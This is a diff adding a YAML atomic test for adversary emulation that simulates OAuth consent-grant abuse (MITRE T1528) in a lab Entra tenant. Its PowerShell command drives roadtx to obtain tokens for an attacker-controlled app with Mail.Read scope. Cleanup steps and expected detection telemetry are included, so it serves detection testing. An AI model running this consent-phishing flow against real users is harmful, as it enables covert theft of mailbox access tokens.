@@ -1,0 +1,65 @@
+attack_technique: T1528
+display_name: "AiTM – OAuth Consent Grant Abuse"
+atomic_tests:
+  - name: "OAuth app consent grant via roadtx"
+    auto_generated_guid: c3d4e5f6-a7b8-9012-cdef-012345678902
+    description: |
+      Tricks a victim into granting an attacker-controlled OAuth application
+      access to their data. After consent, the attacker exchanges the auth
+      code for tokens without requiring the victim's credentials again.
+      Wraps roadtx to simulate the authorization code flow.
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    input_arguments:
+      tenant_id:
+        description: "Entra tenant ID of the lab tenant."
+        type: String
+        default: "00000000-0000-0000-0000-000000000000"
+      client_id:
+        description: "Attacker-controlled OAuth application client ID."
+        type: String
+        default: "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+      redirect_uri:
+        description: "Redirect URI registered on the attacker app."
+        type: Url
+        default: "http://localhost:12345"
+      scope:
+        description: "Requested OAuth scopes (space-separated)."
+        type: String
+        default: "openid profile offline_access Mail.Read"
+      token_output_path:
+        description: "Path to write the resulting token cache file."
+        type: Path
+        default: "#{token_cache_path}"
+    executor:
+      name: powershell
+      command: |
+        roadtx interactiveauth `
+          --client '#{client_id}' `
+          --tenant '#{tenant_id}' `
+          --redirect-url '#{redirect_uri}' `
+          --scope '#{scope}' `
+          --tokenfile '#{token_output_path}'
+    cleanup_command: |
+      if (Test-Path -LiteralPath '#{token_output_path}') {
+          Remove-Item -LiteralPath '#{token_output_path}' -Force
+      }
+    references:
+      - "https://posts.specterops.io/hunting-azure-admins-for-vertical-escalation-3f0c2f430e1e"
+    auth_profile: "oauth-consent"
+    defense_evasion: "Consent phishing; attacker app accumulates delegated permissions"
+    requires_token: false
+    expected_telemetry:
+      - source: graph_audit
+        match:
+          activityDisplayName: "Consent to application"
+        within_minutes: 10
+      - source: entra_signin
+        match:
+          authenticationProtocol: "oAuth2"
+        within_minutes: 10
+    exercises_chokepoint:
+      id: "DC-AUTH-003"
+      url: "https://detectionchokepoints.com/auth/oauth-consent-grant"
